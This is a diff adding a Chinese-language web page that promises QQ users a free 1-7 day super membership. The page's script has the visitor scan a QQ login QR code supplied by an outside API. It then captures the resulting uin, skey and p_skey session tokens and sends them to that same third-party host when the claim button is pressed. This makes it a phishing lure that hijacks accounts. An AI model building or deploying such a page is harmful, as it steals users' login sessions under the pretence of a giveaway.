@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh" class="js">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>随机领取1-7天超级会员</title>
+  <link rel="stylesheet" href="http://tool.txcnm.cn/static/css/dashlite.css">
+  <link rel="stylesheet" href="http://tool.txcnm.cn/static/css/style.css?v=1002">
+</head>
+<body class="nk-body npc-invest bg-lighter ">
+<div class="nk-wrap ">
+  <div class="nk-content nk-content-lg nk-content-fluid">
+    <div class="container-xl" id="app" style="text-align: center;">
+      <div class="col-sm-12 col-md-10 col-xl-8 center-block">
+        <div class="card card-preview">
+          <div class="card-inner mt-3">
+            <div class="nya-title nk-ibx-action-item progress-rating">
+              <span class="nk-menu-text font-weight-bold">领取随机1-7天超级会员</span>
+            </div>
+            <div class="alert alert-info"></em>只限没有会员的企鹅用户领取，自带的不能领</div>
+            <div class="list-group">
+              <div class="list-group-item">
+                <img src="https://tse1-mm.cn.bing.net/th/id/OIP-C.FpoCAsORxnx5oNKw3nr_agHaH6?w=158&h=180&c=7&r=0&o=5&pid=1.7"
+                     width="120px" title="二维码" id="img">
+                <div style="margin-top:5px;color: red;" id="wb"></div>
+              </div>
+            </div>
+            <br/>
+            <div class="form-group">
+              <button type="button" class="btn btn-dim btn-outline-primary btn-block btn-lg" id="submit">领取随机1-7天会员</button>
+              <br/><br/>
+              <a href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=axu2-HIU0rGLli5bSlq0wsyoJuqQFGrA&authKey=YZ78DbLyrgBoOSUn9HOBwzy77gqaGQvfuI6Ez5IPUjRR4RIWOBgNnrC%2FOHWNZuXE&noverify=0&group_code=225214841">
+                <button type="button" class="btn btn-dim btn-outline-primary btn-block btn-lg" id="loca">加群获取更多活动分享</button>
+              </a>
+
+            </div>
+            <div v-html="result" v-show="showresult"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- content @d -->
+  <div class="nk-footer nk-footer-fluid bg-lighter">
+    <div class="container-xl">
+      <div class="nk-footer-wrap">
+        <div class="nk-footer-copyright"> &copy; 2023 领取随机1-7天会员 </div>
+      </div>
+    </div>
+  </div>
+  <!-- footer @e -->
+</div>
+<!-- wrap @e -->
+<script src="//cdn.staticfile.org/jquery/3.6.0/jquery.min.js"></script>
+<script src="//cdn.staticfile.org/bootstrap/4.6.1/js/bootstrap.bundle.min.js"></script>
+<script src="//cdn.staticfile.org/layer/3.5.1/layer.js"></script>
+<script>
+  var uin = "";
+  var skey = "";
+  var pskey = "";
+  //获取二维码
+  $(document).ready(function () {
+    $url = 'http://api.txapi.vip/jk/api/qqkj/index.php?jz=1'
+    //获取base的值
+    $.getJSON($url, function (json) {
+      var data = json['data']['url'];
+      var qrsig = json['data']['qrsig'];
+      //获取图片
+      $("#img").attr("src", data);
+      //判断图片的实效性
+      var myVar = setInterval(function () {
+        $url1 = 'http://api.txapi.vip/jk/api/qqkj/index.php?jz=2&qrsig=' + qrsig;
+        $.getJSON($url1, function (json1) {
+          if (json1['code'] == -2) {
+            $("#wb").html("二维码已经失效~");
+          } else if (json1['code'] == 0) {
+            $("#wb").html("二维码未失效，请先扫码~");
+          } else if (json1['code'] == 3) {
+            $("#wb").text("二维码扫取中~");
+          } else if (json1['code'] == 1) {
+            console.log(json1)
+            $("#img").attr("style","border-radius: 80px")
+            clearInterval(myVar); //当sok=0时停止监控
+            uin = json1['data']['uin'];
+            skey = json1['data']['skey'];
+            pskey = json1['data']['p_skey']
+            $("#wb").text("你好【" + json1['data']['name'] + "】,已经登录成功~");
+            $("#img").attr("src", "http://q.qlogo.cn/headimg_dl?dst_uin=" + json1['data']['uin'] + "&spec=640&img_type=jpg");
+          }
+        });
+      }, 3000);
+    });
+  })
+
+  //按钮点击事件
+  $("loca").click(function (){
+    window.location.href=="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=axu2-HIU0rGLli5bSlq0wsyoJuqQFGrA&authKey=YZ78DbLyrgBoOSUn9HOBwzy77gqaGQvfuI6Ez5IPUjRR4RIWOBgNnrC%2FOHWNZuXE&noverify=0&group_code=225214841";
+
+  })
+
+  $("#submit").click(function(){
+    if(uin != ""){
+      var index = layer.load(2, { shade: [0.5, '#fff'] }); //添加加载动画
+      $.ajax({
+        url: "http://api.txapi.vip/jk/api/qq_sjhy.php",
+        type: "GET",
+        data: {
+          uin: uin,
+          skey:skey,
+          pskey:pskey
+        },
+        dataType: "json",
+        success: function (data) {
+          layer.close(index); //清除加载
+          layer.alert(data.msg,{title:"温馨提示"})
+        }
+      })
+    }else{
+      layer.alert("请先扫码登录~葫芦宝")
+    }
+  })
+</script>
+
+</body>
+
+</html>
